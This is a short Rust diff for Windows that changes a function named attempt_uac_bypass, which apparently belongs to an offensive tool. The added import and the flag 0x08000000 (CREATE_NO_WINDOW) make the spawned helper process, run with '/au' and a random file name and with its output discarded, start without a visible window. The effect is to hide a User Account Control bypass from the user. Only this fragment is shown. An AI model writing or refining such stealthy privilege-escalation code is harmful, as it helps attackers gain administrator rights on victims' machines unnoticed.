@@ -2,6 +2,7 @@ use std::env;
 use std::ffi::CString;
 use std::fs::File;
 use std::io::Write;
+use std::os::windows::process::CommandExt;
 use std::path::Path;
 use std::process::{Command, Stdio};
 use std::ptr::null_mut;
@@ -62,6 +63,7 @@ pub fn attempt_uac_bypass() -> bool {
     let mut child = match Command::new(binary_path)
         .arg("/au")
         .arg(&random_file_name)
+        .creation_flags(0x08000000)
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .spawn()
